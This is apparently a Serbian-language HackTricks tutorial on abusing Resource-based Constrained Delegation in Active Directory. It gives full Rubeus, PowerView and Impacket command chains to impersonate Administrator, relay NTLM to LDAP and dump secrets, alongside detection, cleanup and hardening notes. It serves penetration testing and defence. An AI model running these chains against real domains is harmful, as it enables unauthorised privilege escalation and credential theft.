# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Osnove Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) je sličan [constrained delegation](constrained-delegation.md), ali je smer poverenja obrnut. Tradicionalni constrained delegation beleži kojim servisima principal može da delegira; RBCD beleži na **ciljnom resursu** koji principal-i mogu da se predstavljaju kao korisnici prilikom pristupa tom resursu.<sup>[[12]](#references)</sup>

Atribut _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ ciljnog objekta sadrži security descriptor koji identifikuje principal-e kojima je dozvoljeno da u tom resursu postupaju u ime drugih identiteta.

Još jedna važna razlika je u tome što principal sa dovoljnim **write dozvolama nad mašinskim nalogom** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` i slična prava) možda može da postavi _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Podešavanje tradicionalnog constrained delegation-a obično zahteva privilegovaniji administrativni pristup.<sup>[[1]](#references)</sup>

Preciznije, izmena podešavanja klasičnog constrained delegation-a obično je ograničena privilegijom `SeEnableDelegationPrivilege` na kontroleru domena, koju najčešće imaju visoko privilegovani administratori. RBCD prebacuje odluku na security descriptor ciljnog objekta, pa pristup za pisanje odgovarajućeg svojstva računarskog objekta može biti dovoljan i bez te korisničke privilegije.<sup>[[1]](#references)[[2]](#references)</sup>

### Novi koncepti

Zastavica **`TrustedToAuthForDelegation`** u `userAccountControl` često se opisuje kao preduslov za **S4U2Self**, ali to nije sasvim tačno.\
Service principal sa SPN-om može da zatraži S4U2Self i bez te zastavice. Kada je postavljena zastavica `TrustedToAuthForDelegation`, vraćena service ticket je **forwardable**; bez nje je ticket obično **non-forwardable**.<sup>[[5]](#references)</sup>

Tradicionalni constrained delegation odbija **non-forwardable TGS** u koraku S4U2Proxy. RBCD može da prihvati tu S4U2Self ticket ako security descriptor cilja ovlašćuje servis koji šalje zahtev.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Struktura napada

> Ako imate **privilegije ekvivalentne write pravima** nad **računarskim nalogom**, možda možete da ostvarite privilegovan pristup toj mašini.

Pretpostavimo da napadač već ima **privilegije ekvivalentne write pravima nad objektom računara žrtve**.

1. Napadač **kompromituje** nalog sa **SPN-om** ili **ga kreira** („Service A“). Podrazumevano, autentifikovani korisnik domena može da kreira najviše 10 računarskih objekata, što je određeno vrednošću **_MachineAccountQuota_**; računarski objekat automatski obezbeđuje upotrebljive SPN-ove.
2. Napadač **zloupotrebljava svoje WRITE pravo** nad računarom žrtve (ServiceB) da podesi **resource-based constrained delegation tako da ServiceA može da se predstavlja kao bilo koji korisnik** prilikom pristupa tom računaru žrtve (ServiceB).
3. Napadač koristi Rubeus da izvede **potpun S4U napad** (S4U2Self i S4U2Proxy) sa Service A na Service B, za korisnika **koji ima privilegovan pristup Service B**.
   1. S4U2Self (sa kompromitovanog ili kreiranog SPN naloga): zatraži **TGS koji predstavlja Administratora za Service A** (non-forwardable).
   2. S4U2Proxy: upotrebi taj **non-forwardable TGS** da zatraži service ticket koja predstavlja **Administratora** za **host žrtve**.
   3. Non-forwardable ticket i dalje može da funkcioniše u ovom RBCD toku jer je Service A ovlašćen u security descriptor-u ciljnog resursa.
4. Napadač može da upotrebi **pass-the-ticket** i da se **predstavlja** kao korisnik kako bi ostvario **pristup ServiceB žrtve**.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` onemogućava podrazumevani način kreiranja računara, ali ne uklanja write prava nad ciljnim računarskim objektom niti kontrolu nad postojećim nalogom. Kontrolisani običan korisnik bez SPN-a ponekad može da se koristi kao principal koji delegira, koristeći [SPN-less U2U method](#spn-less-cross-domain--cross-forest-rbcd), uključujući i unutar jednog domena. Taj način i dalje zahteva efektivno RBCD write pravo, kontrolu nad kredencijalima korisnika koji delegira, identitet koji može da se delegira i koji se lažno predstavlja, kompatibilno Kerberos ponašanje šifrovanja i promenu NT hash-a koja remeti nalog. Tretirajte ih kao zasebne preduslove; samo prazan RBCD atribut ili nulta kvota ne dokazuju ni da je napad uspešan ni da je okruženje bezbedno.

Postojeći RBCD descriptor može da navodi i **grupu**, umesto direktno računara koji delegira. Ako kontrolišete računarski nalog sa SPN-om i možete da ga dodate u tu grupu, novo članstvo može da omogući put za delegiranje bez izmene RBCD atributa ciljnog računara. Pre nego što zaključite da je taj put moguć, proverite efektivni ACL grupe za upis članstva (uključujući deny ACE), ugnježdeno članstvo i osvežavanje tokena, SID trustee-a u descriptor-u, ograničenja delegiranja za nalog koji se lažno predstavlja i SPN ciljnog servisa.

Vrednost _**MachineAccountQuota**_ domena možete da proverite pomoću:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Napad

### Kreiranje računarskog objekta

Možete da kreirate računarski objekat u domenu pomoću **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Konfigurisanje delegiranja ograničenog na osnovu resursa

**Korišćenjem PowerShell modula za Active Directory**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Korišćenje powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Izvođenje kompletnog S4U napada (Windows/Rubeus)

Prvo smo kreirali novi Computer objekat sa lozinkom `123456`, pa nam je potreban hash te lozinke:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Ovo će ispisati RC4 i AES hash vrednosti za taj nalog.\
Sada se napad može izvršiti:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Možete generisati više tiketa za više servisa jednim zahtevom koristeći parametar `/altservice` u Rubeus-u:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Korisnici mogu biti označeni kao **„Nalog je osetljiv i delegiranje nije dozvoljeno.“** Ako je ova oznaka omogućena, nalog se ne može impersonirati kroz ovaj tok delegiranja. BloodHound prikazuje ovo svojstvo tokom analize.

### Linux alati: RBCD od početka do kraja pomoću Impacket-a (2024+)

Ako radite iz Linux-a, možete da izvedete ceo RBCD lanac pomoću zvaničnih Impacket alata:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Beleške
- Ako je LDAP signing/LDAPS nametnut, koristite `impacket-rbcd -use-ldaps ...`.
- Dajte prednost AES ključevima; mnogi moderni domeni ograničavaju RC4. Impacket i Rubeus podržavaju tokove koji koriste samo AES.
- Impacket može da prepiše `sname` („AnySPN“) za neke alate, ali kad god je moguće pribavite ispravan SPN (npr. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Reflective RBCD for an SPN-less Kerberos-only delegator

Kompromitovani korisnik sa **`msDS-AllowedToDelegateTo`, ali bez SPN-a ili `TrustedToAuthForDelegation`**, ne može pomoću običnog S4U2Self da dobije forwardable evidence ticket potreban za [Kerberos-only constrained delegation](constrained-delegation.md#protocol-transition-vs-kerberos-only-constrained-delegation).<sup>[[1]](#references)[[18]](#references)</sup> Ako taj korisnik može da upisuje RBCD u svoj **sopstveni** AD objekat, nalog pod kontrolom napadača koji ima SPN prvo može da delegira *korisniku*.<sup>[[1]](#references)[[18]](#references)</sup> Ovaj RBCD korak daje forwardable ticket za personifikovanog korisnika namenjen nalogu bez SPN-a, koji zatim postaje evidence ticket za drugi S4U2Proxy ka SPN-u na listi dozvola za klasičnu delegaciju kompromitovanog naloga.<sup>[[18]](#references)[[19]](#references)</sup>

Za prvi korak bez SPN-a, S4U2Proxy zahtev pomoćnog naloga mora da koristi **U2U**: `enc-tkt-in-skey` navodi KDC da šifruje ticket ključem sesije delegatorovog TGT-a umesto da traži SPN ključ.<sup>[[18]](#references)[[19]](#references)</sup> KDC-u su takođe potrebni RBCD bit u `PA-PAC-OPTIONS`, delegatorov TGT i S4U2Self evidence ticket.<sup>[[18]](#references)[[20]](#references)</sup> Autorov fork alata Impacket `getST.py` dodaje opcije `-nospn` i `-tgt` za ovaj zahtev; podrška za `-nospn`/`-tgt` nalazi se u upstream Impacket PR #2324, zato koristite fork на koji vodi link umesto da pretpostavite da stock `getST.py` podržava taj korak.<sup>[[18]](#references)[[20]](#references)</sup>

Ovaj primer pretpostavlja da je `svc_web` kompromitovan, da može da upisuje sopstveni RBCD atribut i da mu je dozvoljeno da delegira na `host/dc01.corp.local`. Takođe se pretpostavlja da može da se kreira pomoćni nalog sa SPN-om, da je RC4 dozvoljen i da izabrani `Administrator` može da se delegira. Zatražite **RC4 TGT** pomoću NT hash-a kompromitovanog naloga. Pokrenite **prvi** `getST.py` iz autorovog forka; pregledajte izlaz alata `describeTicket.py` i ispod zamenite vrednost **RC4 TGT ključa sesije**. Poslednji `getST.py` može biti stock Impacket. Zatražite TGT **pre** promene NT hash-a; ova promena će poremetiti rad servisnog naloga dok mu se lozinka ne resetuje.<sup>[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

```bash
pypykatz crypto nt 'OldPass!'
getTGT.py -hashes ':<CURRENT_NT_HASH>' 'corp.local/svc_web' -dc-ip 10.0.0.10
describeTicket.py svc_web.ccache
addcomputer.py -computer-name 'HELPER$' -computer-pass 'HelperPass!' -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
rbcd.py -delegate-from 'HELPER$' -delegate-to svc_web -action write -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
changepasswd.py 'corp.local/svc_web:OldPass!@10.0.0.10' -newhashes ':<RC4_TGT_SESSION_KEY>'
python3 ./getST.py -u2u -impersonate Administrator -nospn svc_web -tgt svc_web.ccache -dc-ip 10.0.0.10 'corp.local/HELPER$:HelperPass!'
KRB5CCNAME=svc_web.ccache impacket-getST -impersonate Administrator -spn host/dc01.corp.local -additional-ticket 'Administrator@svc_web@CORP.LOCAL.ccache' -k -no-pass -dc-ip 10.0.0.10 'corp.local/svc_web'
```

Za razliku od [SPN-less RBCD putanje ispod](#spn-less-cross-domain--cross-forest-rbcd), ovaj lanac koristi SPN-less nalog kao **RBCD cilj, a zatim kao klasičnog KCD delegatora**. I dalje je potreban još jedan kontrolisani nalog sa SPN-om. Ako je `MachineAccountQuota=0`, već kontrolisani SPN nalog može zameniti novi računar; nulta kvota sama po sebi ne sprečava ovu putanju.<sup>[[18]](#references)[[19]](#references)</sup>

## RBCD između domena i šuma

Ako se **delegirajući principal** koji kontrolišete nalazi u **drugom domenu** (ili čak u **drugom šumu**) od **računara resursa**, zloupotreba je i dalje **RBCD**, ali tok tiketa više nije uobičajeni `S4U2Self -> S4U2Proxy` unutar jednog domena.

### RBCD između domena: konfigurisanje stranog principala pomoću SID-a

Kada postavite `msDS-AllowedToActOnBehalfOfOtherIdentity` iz **drugog domena**, stranu mašinu/korisnika možda **neće biti moguće razrešiti po imenu** u LDAP-u ciljnog domena. U tom slučaju, konfigurišite unos delegiranja pomoću **SID-a** stranog principala umesto njegovog sAMAccountName/UPN-a.

Ovo je posebno važno pri relay-u NTLM-a ka LDAP-u pomoću `ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Napomene:
- `--sid` govori alatu `ntlmrelayx.py` da tretira `--escalate-user` kao SID, što je neophodno kada je delegirajući nalog iz drugog domena od ciljnog domena.
- Čak i ako alat ispiše `User not found in LDAP`, upis delegacije ipak može da uspe jer se u bezbednosnom deskriptoru direktno čuva strani SID.

### Međudomenski RBCD: S4U sekvenca između realm-ova

Kada se strani principal doda u `msDS-AllowedToActOnBehalfOfOtherIdentity`, funkcionalni međudomenski tok je:<sup>[[9]](#references)[[13]](#references)</sup>

1. Preuzmite **TGT** za delegirajući principal iz njegovog domena.
2. Zatražite **referral TGT** za `krbtgt/<target-domain>`.
3. Na DC-u ciljnog domena zatražite **cross-realm S4U2Self referral** za korisnika čiji se identitet preuzima.
4. Zatražite stvarni **S4U2Self** ticket za tog korisnika nazad u domenu delegatora.
5. Izvršite **S4U2Proxy** u domenu delegatora da biste dobili referral ticket za ciljni domen.
6. Izvršite završni **S4U2Proxy** na DC-u ciljnog domena da biste dobili service ticket za `cifs/host.target`, `host/host.target` itd.

Zbog toga standardni Linux alati često ne rade za međudomenski RBCD:<sup>[[9]](#references)</sup>
- request **realm** možda mora da se razlikuje od realm-a TGT-a korišćenog u `TGS-REQ`
- lanac zahteva **nezavisne S4U2Proxy korake**, a ne samo `S4U2Self` ili `S4U2Self` praćen jednim `S4U2Proxy`

### Međudomenski RBCD iz Linux-a

Synacktiv je objavio implementaciju za Impacket `getST.py` koja ponavlja sekvencu između realm-ova iz Linux-a tako što eksplicitno obrađuje oba KDC-a:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Operativno, novi argumenti su:
- `-dc-ip`: DC delegirajućeg domena
- `-targetdomain`: domen računara-resursa
- `-targetdc`: DC domena resursa

### Ograničenja RBCD između šuma

RBCD između šuma ima važno ograničenje: **korisnik čiji se identitet imitira mora pripadati istom šumu kao i delegirajući principal**. Drugim rečima, ako je vaš kontrolisani machine account u `valhalla.local`, a ciljni resurs u `asgard.local`, uglavnom **ne možete da imitirate proizvoljne korisnike iz `asgard.local` na tom resursu putem RBCD**.<sup>[[9]](#references)</sup>

I dalje se može iskoristiti kada:
- je korisnik iz **delegirajućeg šuma** **lokalni administrator** (ili ima druge privilegije) na hostu resursa u drugom šumu
- trust omogućava neophodnu putanju za autentifikaciju, a strani SID je prihvaćen u security descriptor-u ciljnog računara

### Specifičnosti RBCD protokola između šuma

RBCD između šuma nije samo „između domena uz trust“. Uočeni tok uključuje dve specifičnosti koje uobičajeni alati tradicionalno ne uzimaju u obzir:<sup>[[9]](#references)</sup>

1. Dodatni zahtev **S4U2Proxy** koji postavlja **`PA-PAC-OPTIONS=branch-aware`**
2. Završna service ticket karta koja može biti vraćena korišćenjem **RC4**, čak i kada su zatraženi drugi etype-ovi

Praktični tok je:

1. Preuzmite TGT za delegirajući principal u šumu A.
2. Zatražite **S4U2Self** za korisnika čiji se identitet imitira u šumi A.
3. Zatražite **S4U2Proxy** u šumi A da biste dobili referral TGT za šumu B.
4. Pošaljite drugi zahtev **S4U2Proxy** u šumi A **bez S4U2Self karte kao dodatne karte**, ali sa uključenim `branch-aware`, da biste dobili još jedan referral TGT za šumu B.
5. Po želji zatražite uobičajenu service ticket kartu u šumi B za delegirajući principal (ova karta nije neophodna za završnu zloupotrebu).
6. Upotrebite referral karte iz koraka 3 i 4 da biste zatražili završnu kartu **S4U2Proxy** u šumi B za korisnika iz šume A čiji se identitet imitira, za ciljni SPN.

### RBCD između šuma sa Linuxa

Ista Synacktiv Impacket grana dodaje prekidač `-forest` za ovu logiku:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### Rekurzivni RBCD u više domena (3+ domena)

U **šumama sa više domena**, i **S4U2Self** i **S4U2Proxy** mogu da budu **rekurzivni**, umesto da se zaustave nakon jednog upućivanja:

- **Rekurzivni S4U2Self**: prvi `S4U2Self` šalje se u **domen impersoniranog korisnika**, prolazi kroz posredne hopove između nadređenih/podređenih domena pomoću uobičajenih `TGS-REQ` upućivanja za `krbtgt/<REALM>`, a **završni `S4U2Self`** šalje se u **domenu delegirajućeg principala**.
- To znači da **samo posedovanje TGT-a** za nalog računara može biti dovoljno za impersoniranje **administratora iz drugog domena u istoj šumi** i zahtevanje `cifs/host`, `host/host`, `wsman/host` itd.
- **Rekurzivni S4U2Proxy** prati lanac poverenja na isti način: posredni hopovi ponovo koriste prethodnu kartu kao TGT dok zahtevaju sledeće `krbtgt/<REALM>` upućivanje, a samo poslednji hop vraća završnu servisnu kartu.<sup>[[10]](#references)</sup>

Praktičan primer u istoj šumi je:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### RBCD bez SPN-a između domena / šuma

Ako je **delegirajući principal korisnik bez SPN-a**, poslednji rekurzivni `S4U2Self` ne uspeva sa **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Rešenje je da se **ponovi samo poslednji korak pomoću `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Ukratko, lanac zloupotrebe:

1. Autentifikujte se pomoću **NT hash-a** kako biste usmerili KDC ka **RC4-HMAC (etype 23)**.
2. Najpre zatražite **`-self -u2u`** i sačuvajte taj ticket odvojeno od kasnijeg proxy koraka.
3. Izdvojite **TGT session key** pomoću `describeTicket.py`.
4. Zamenite korisnikov **NT hash** tim **session key-em** pomoću `changepasswd.py -newhashes <session_key>`.
5. Ponovo upotrebite ticket **`S4U2Self+U2U`** kao **`-additional-ticket`** tokom zasebnog zahteva **`-proxy`**.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Operativne napomene:

- Kada je **prvi pouzdani hop već druga šuma**, prednost dajte **branch-aware** algoritmu (`getST.py ... -forest`) kako bi se podudaralo ponašanje izvornog Windows sistema. Ako se do strane šume dolazi tek kasnije u lancu, nerekurzivni tok koji ne uzima grane u obzir i dalje može da funkcioniše.<sup>[[9]](#references)</sup>
- Na novijim DC-ovima sa **Windows Server 2022/2025**, forsiranje RC4 može da ne uspe uz grešku **`KDC_ERR_ETYPE_NOSUPP`** zbog ukidanja RC4; zbog toga SPN-less RBCD može biti nemoguć, iako klasični RBCD zasnovan na SPN-u i dalje radi sa AES-om.<sup>[[15]](#references)</sup>
- Pokrenite **`S4U2Self+U2U` pre promene korisnikovog hash-a/lozinke**: **`SamrChangePasswordUser`** ne preračunava Kerberos AES ključeve naloga, pa promena lozinke pre toga može da onemogući kasnije zahteve za tikete.<sup>[[14]](#references)</sup>
- Za impersonirani nalog i dalje mora biti **dozvoljena delegacija**: **Protected Users** i nalozi sa **`NOT_DELEGATED`** / **„Account is sensitive and cannot be delegated“** blokiraju ovaj lanac.

## Napomene o detekciji i ojačavanju bezbednosti

- RBCD putanje između domena/šuma i dalje se obično uspostavljaju zloupotrebom **ACL-a** ili putem **relay-to-LDAP**. Na DC-ovima nametnite **LDAP signing** i **LDAP channel binding** da biste prekinuli uobičajene načine njihovog uspostavljanja.
- Proverite ko može da upisuje u `msDS-AllowedToActOnBehalfOfOtherIdentity` na računarskim objektima i razrešite sačuvane SID-ove, uključujući **foreign security principals**.
- U okruženjima sa mnogo trust-ova proverite **Selective Authentication**, **SID filtering** i da li korisnici iz strane šume imaju prava **lokalnog administratora** na hostovima sa resursima.

### Pristup

Poslednja komandna linija će izvršiti **kompletan S4U napad i ubaciti TGS** od Administrator-a na host žrtve u **memoriju**.\
U ovom primeru zatražen je TGS za uslugu **CIFS** od Administrator-a, tako da ćete moći da pristupite **C$**:

```bash
ls \\victim.domain.local\C$
```

### Zloupotreba različitih service tickets

Saznajte više o [**dostupnim service tickets ovde**](silver-ticket.md#available-services).

## Enumerisanje, revizija i čišćenje

### Enumerisanje računara sa konfigurisanom RBCD

PowerShell (dekodiranje SD-a radi razrešavanja SID-ova):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (čitanje ili pražnjenje jednom komandom):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Čišćenje / resetovanje RBCD

- PowerShell (brisanje atributa):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Kerberos greške

- **`KDC_ERR_ETYPE_NOTSUPP`**: To znači da je Kerberos konfigurisan tako da ne koristi DES ili RC4, a vi navodite samo RC4 hash. Navedite Rubeus-u bar AES256 hash (ili mu navedite RC4, AES128 i AES256 hashove). Primer: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** tokom `-self` za običnog korisnika: delegirajući principal verovatno **nema SPN**. Ponovo pokušajte **poslednji hop** koristeći **`S4U2Self+U2U`** umesto uobičajenog `S4U2Self`.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** tokom **SPN-less RBCD**: noviji DC-ovi mogu odbiti forsirani **RC4-HMAC** put potreban za trik `S4U2Self+U2U` + zamena session key-a. Umesto toga pokušajte klasičan **SPN-backed** RBCD put sa AES-om.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: To znači da se vreme na trenutnom računaru razlikuje od vremena na DC-u i da Kerberos ne radi ispravno.
- **`preauth_failed`**: To znači da navedeno korisničko ime i hashovi ne omogućavaju prijavljivanje. Možda ste zaboravili da dodate „$“ u korisničko ime prilikom generisanja hashova (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`** tokom S4U2Proxy: Proverite ograničenja delegiranja za lažno predstavljeni nalog, zastavicu forwardable na evidence ticket-u i da li classic KCD ili RBCD descriptor cilja odobrava ovaj hop. Ovo je **greška KDC politike delegiranja**, a ne provera da li je ciljna usluga pokrenuta ili da li korisnik ima pristup na nivou aplikacije. Neregistrovani ciljni SPN obično daje **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**.<sup>[[21]](#references)[[22]](#references)</sup>

## Napomene, relay napadi i alternative

- RBCD SD možete zapisati i preko AD Web Services (ADWS) ako je LDAP filtriran. Pogledajte:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay lanci se često završavaju RBCD-om kako bi se lokalni SYSTEM dobio u jednom koraku. Pogledajte praktične primere od početka do kraja:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Ako su LDAP signing/channel binding **isključeni** i možete da napravite machine account, alati poput **KrbRelayUp** mogu da proslede prinudno izazvanu Kerberos autentifikaciju na LDAP, podese `msDS-AllowedToActOnBehalfOfOtherIdentity` za vaš machine account na objektu ciljnog računara i odmah se predstave kao **Administrator** pomoću S4U-a sa udaljenog računara.<sup>[[8]](#references)</sup>

## References

- [1] [Mahanje repom psa: Zloupotreba Resource-Based Constrained Delegation za napad na Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Još jedna reč o delegiranju – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Preuzimanje objekta računara](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Zloupotreba Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity je ubio domen: Pregled ofanzivnog Kerberos-a](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (zvanični)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Brzi Linux podsetnik sa novijom sintaksom](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing isključen → Kerberos relay do RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Istraživanje RBCD-a između domena i forest-a](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Istraživanje RBCD-a između domena i forest-a: drugi deo](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket grana - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Pregled Kerberos constrained delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - S4U2Self između domena](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Otkrivanje i otklanjanje upotrebe RC4 u Kerberos-u](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – Detalji o S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
